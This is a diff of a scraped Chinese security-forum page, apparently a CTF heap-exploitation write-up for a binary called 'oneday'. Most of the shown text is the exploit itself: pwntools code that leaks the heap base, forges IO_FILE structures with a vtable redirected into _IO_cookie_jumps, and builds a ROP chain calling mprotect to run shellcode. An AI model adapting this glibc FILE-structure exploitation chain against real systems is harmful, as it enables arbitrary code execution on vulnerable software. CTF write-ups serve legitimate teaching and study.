@@ -302,31 +302,11 @@ https://bbs.kanxue.com/user-home-991890.htm
 ```
 一
 前言
-```
-
-
-
-```
 二
 前置知识
-```
-
-
-
-```
 mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
-```
-
-
-
-```
 三
 脚本分析
-```
-
-
-
-```
 io.sendlineafter(b'enter your key >>n', str(10).encode())
 add(2)#0
 add(2)#1
@@ -334,11 +314,6 @@ add(1)#2
 delete(2)
 delete(1)
 delete(0)
-```
-
-
-
-```
 add(1)#3
 add(1)#4
 add(1)#5
@@ -351,21 +326,11 @@ io.recv(2)
 heap_base = u64(io.recv(6).ljust(8, b'x00')) - 0x17f0
 delete(4)
 delete(6)
-```
-
-
-
-```
 add(3)#7
 add(1)#8
 add(1)#9
 delete(8)
 add(3)#10
-```
-
-
-
-```
 f1 = IO_FILE_plus_struct()
 f1._IO_read_ptr = 0xa81
 f1.chain = chain
@@ -382,11 +347,6 @@ f2._mode = 0
 f2._lock = _lock
 f2._flags2 = 8
 f2.vtable = _IO_cookie_jumps + 0x58
-```
-
-
-
-```
 data = flat({
  0x8: target_addr - 0x20,
  0x10: {
@@ -417,17 +377,7 @@ data = flat({
  0xa80: [0, 0xab1]
  }
 })
-```
-
-
-
-```
 mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
-```
-
-
-
-```
 pop_rdi_ret,
 chain & ~0xfff,
 pop_rsi_ret,
@@ -436,11 +386,6 @@ pop_rdx_rbx_ret,
 7, 0,
 libc_base + libc.sym['mprotect'],
 chain + 0x200
-```
-
-
-
-```
 from pwn import *
 from pwncli import *
 io = process("./oneday")
@@ -569,18 +514,8 @@ delete(2)
 add(3)
 exit()
 io.interactive()
-```
-
-
-
-```
 四
 debug来了解整个攻击的流程
-```
-
-
-
-```
 五
 总结
 ```
